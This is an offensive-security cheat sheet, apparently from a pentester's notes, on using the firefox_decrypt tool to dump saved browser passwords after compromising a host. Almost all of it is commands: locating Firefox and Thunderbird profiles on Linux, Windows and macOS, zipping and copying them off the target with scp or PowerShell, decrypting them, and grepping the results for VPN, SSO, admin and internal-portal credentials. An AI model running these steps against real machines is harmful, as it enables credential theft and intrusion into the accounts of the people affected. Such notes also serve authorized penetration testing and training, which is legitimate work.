# Firefox Decrypt

**Tags:** `#firefoxdecrypt` `#credentialdumping` `#browsercreds` `#pillaging` `#postexploitation` `#auth`

Python tool that extracts saved passwords from Mozilla Firefox, Waterfox, Thunderbird, and SeaMonkey profiles. Useful post-foothold for harvesting stored credentials from a compromised user's browser — often yields domain creds, VPN passwords, and web app logins.

**Source:** https://github.com/unode/firefox_decrypt
**Install:** `git clone https://github.com/unode/firefox_decrypt` — requires Python 3 and NSS libraries

```bash
# NSS library dependency (usually pre-installed on Kali)
apt install python3-nss    # if missing
```

---

## Firefox Profile Locations

```bash
# Linux
~/.mozilla/firefox/                        # Firefox
~/.thunderbird/                            # Thunderbird

# Windows
C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\
C:\Users\<user>\AppData\Roaming\Thunderbird\Profiles\

# macOS
~/Library/Application Support/Firefox/Profiles/
```

The profile folder contains `profiles.ini` — point firefox_decrypt at the folder containing this file.

---

## Usage

### Local — Running on the Compromised Host

```bash
# Auto-detect profile (uses default profile)
python3 firefox_decrypt.py

# Specify profile directory explicitly
python3 firefox_decrypt.py /home/user/.mozilla/firefox/

# If the profile is password-protected, it will prompt for the master password
```

### Remote — Exfil Profiles and Decrypt Locally

More common on engagements — copy the profile off the target and run locally on your attack box.

```bash
# On target — zip the profile folder
zip -r firefox_profile.zip /home/user/.mozilla/firefox/

# Transfer to attack box (SCP, SMB, HTTP, etc.)
scp user@target:/tmp/firefox_profile.zip .

# Extract and decrypt locally
unzip firefox_profile.zip
python3 firefox_decrypt.py ./firefox/
```

### Windows Target — Copy Profile

```powershell
# Locate profiles on Windows target
Get-ChildItem "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\" -ErrorAction SilentlyContinue

# Compress profile for exfil
Compress-Archive "C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\" -DestinationPath C:\Temp\ff_profile.zip
```

---

## Output Formats

```bash
# Default — human readable, prompts interactively
python3 firefox_decrypt.py /path/to/profile/

# CSV output — easier to parse and store
python3 firefox_decrypt.py --format csv /path/to/profile/

# Pass-store format (compatible with pass password manager)
python3 firefox_decrypt.py --format pass /path/to/profile/

# Filter results — grep for specific keywords
python3 firefox_decrypt.py /path/to/profile/ | grep -C2 -i "vpn\|corp\|domain\|admin"

# Non-interactive — skip profiles with master passwords
python3 firefox_decrypt.py --no-interactive /path/to/profile/
```

---

## Multiple Profiles / Multi-User Systems

```bash
# List all profiles found
python3 firefox_decrypt.py --list /path/to/profiles.ini/

# Decrypt a specific profile by number (when multiple exist)
python3 firefox_decrypt.py /path/to/profile/
# → Tool will list profiles and prompt for selection; enter the number

# Loop through all users on a Windows box (run from attacker box after exfil)
for profile in ./profiles/*/; do
    echo "=== $profile ==="
    python3 firefox_decrypt.py "$profile" --format csv 2>/dev/null
done
```

---

## Tips

> [!note] **Master Password** — If the profile has a master password set, firefox_decrypt will prompt for it. Without it, saved passwords cannot be decrypted. Try blank first — most users don't set one.

> [!tip] **What to look for in output** — Filter for corporate SSO, VPN, OWA/Exchange, internal portals, and admin panels. Credentials stored here are often reused across systems and may grant immediate access to high-value targets.

```bash
# Dump to file and grep for high-value targets
python3 firefox_decrypt.py --format csv /path/to/profile/ > ff_creds.csv
grep -i "vpn\|citrix\|rdweb\|outlook\|admin\|jira\|confluence\|gitlab" ff_creds.csv
```

> [!note] **Related tools** — LaZagne (`lazagne.py browsers`) covers Firefox plus Chrome, IE, and other browsers in one run and is often the better choice on Windows targets when you want all browser creds at once.
